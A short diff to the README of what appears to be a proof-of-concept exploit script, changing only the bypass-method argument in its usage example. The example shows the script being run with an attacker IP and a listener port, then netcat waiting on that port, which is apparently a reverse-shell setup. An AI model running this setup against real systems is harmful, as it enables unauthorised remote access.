@@ -32,7 +32,7 @@ optional arguments:
 ##### Example:
 1) Run the script for Linux OS with bypass payload of method
 ```
-python poc-csw.py --userip private-ip --webport 8888 --lport 9001 -b method
+python poc-csw.py --userip private-ip --webport 8888 --lport 9001 -b methods
 ```
 ![](images/img1.png)
 2) run netcat on port 9001 in your local machine 
